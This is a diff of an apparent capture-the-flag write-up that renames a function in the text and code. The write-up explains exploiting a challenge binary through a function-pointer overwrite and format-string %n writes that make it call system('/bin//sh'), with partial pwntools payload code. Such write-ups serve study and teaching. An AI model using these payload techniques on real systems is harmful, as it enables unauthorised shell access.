@@ -75,8 +75,8 @@ Let's have a look at it.
 We can see that this function receives an argument, arg_0, and simple calls system(arg_0).
 To be easier to remember we're going to call it **call_system**.
 
-
 Looking again at the xrefs we see that sub_80486C7 is calling **call_system**.
+
 ![alt text](./images/choose_arg.png)
 
 By looking at the logic of this function, to jump to **call_system** the address 0x804A02C must be equal to one and the **argument** is at the address 0x804A30, both of this address are in the bss memory which has read/write permissions, let's call this function **choose_arg**.
@@ -97,9 +97,9 @@ Note that it is not possible to overwrite the return address because a check is 
 
 Before the call to **function_pointer** is made, a simple check is done, the content of the "**function_pointer** - 0x4" must be "0x4EC8310" so we can't jump to wherever we want.
 
-Searching the binary with this opcode we find 6 occurrences one of them being the **vuln** function that we've analysed before.
+Searching the binary with this opcode we find 6 occurrences one of them being the **choose_arg** function that we've analysed before.
 
-At this point its pretty obvious that we need to overwrite **function_pointer** with **vuln** function pointer.
+At this point its pretty obvious that we need to overwrite **function_pointer** with **choose_arg** function pointer.
 ![alt text](./images/vuln.png)
 
 Distance between **destination** and **function_pointer** is less than 0x100 so a overwrite on **function_pointer** possible.
@@ -107,7 +107,7 @@ Distance between **destination** and **function_pointer** is less than 0x100 so 
 ![alt text](./images/stack.png)
 # What we know
 
-  We can overwrite the **pointer_function** so the program calls **vuln** instead.
+  We can overwrite the **pointer_function** so the program calls **choose_arg** instead.
 
   We must place the value 1 on the address "0x804A02C" and we have to put an address on "0x804A030" that points to system **argument** in order to call **call_system(argument)**.
 
@@ -116,12 +116,12 @@ Distance between **destination** and **function_pointer** is less than 0x100 so 
 ## First Part
 To overwrite the **function_pointer** we need 20 bytes of padding.
 ```python
-vuln_address = 0x80486C7
-function_pointer = p32(vuln_address)
+choose_arg = 0x80486C7
+function_pointer = p32(choose_arg)
 payload = 'A'*20 + function_pointer
 ```
 ## Second Part
-Like this we're jumping to **vuln** function but because content of "0x0804A02C" != 1, the program flow is not reaching **call_system**.
+Like this we're jumping to **choose_arg** function but because content of "0x0804A02C" != 1, the program flow is not reaching **call_system**.
 
 Writing to an arbitrary address with a format string vulnerability is pretty easy, but it will print at least 4 characters, the address where we want to write to, but we need to write  the value 1. So if the minimum value we can write to an address is 4 how can we write the value 1?
 >Remember: we need to write 1 on the address "0x0804A02C".
@@ -138,8 +138,8 @@ There was an "overflow" and we started to write to "0x804A02C"
 
 ```python
 write_0x100_addr = p32(0x804A02B)
-vuln_address = 0x80486C7
-function_pointer = p32(vuln_address)
+choose_arg = 0x80486C7
+function_pointer = p32(choose_arg)
 
 payload  = write_0x100
 payload += "%s" + str(0x100-0x4) + "p" + "%20$n" #want to write 0x100, but we have printed 4 bytes from write_0x100_addr
@@ -162,7 +162,7 @@ Through format string vuln we can do both writes so let's place our string in "0
 
 The string used was /bin//sh.
 ```
-Note: We probably could use just sh and the result would be the same but much more simpler and easy.
+Note: We probably could use just "sh" and the result would be the same but much more simpler and easy.
 ```
 
 Then we simply need to write in "0x0804A030" the address of the string "0x0804A020"
@@ -186,8 +186,8 @@ We will write to the addresses  2 byte at the same time.
 The order at which the addresses are put on the **input** buffer is irrelevant, we just need to be careful with the offset.
 ```python
 write_0x100_addr = p32(0x0804A02b)
-vuln_address = 0x080486C7
-function_pointer = p32(vuln_address)
+choose_arg = 0x080486C7
+function_pointer = p32(choose_arg)
 bin_sh_addr = 0x0804A020
 arg_addr = 0x0804A030
 
@@ -236,8 +236,8 @@ Now we have printed 0x0804 bytes, so to write 0x2f2f to the address we actually 
 from pwn import *
 
 write_0x100_addr = p32(0x0804A02b)
-vuln_address = 0x080486C7
-function_pointer = p32(vuln_address)
+choose_arg = 0x080486C7
+function_pointer = p32(choose_arg)
 bin_sh_addr = 0x0804A020
 arg_addr = 0x0804A030
 
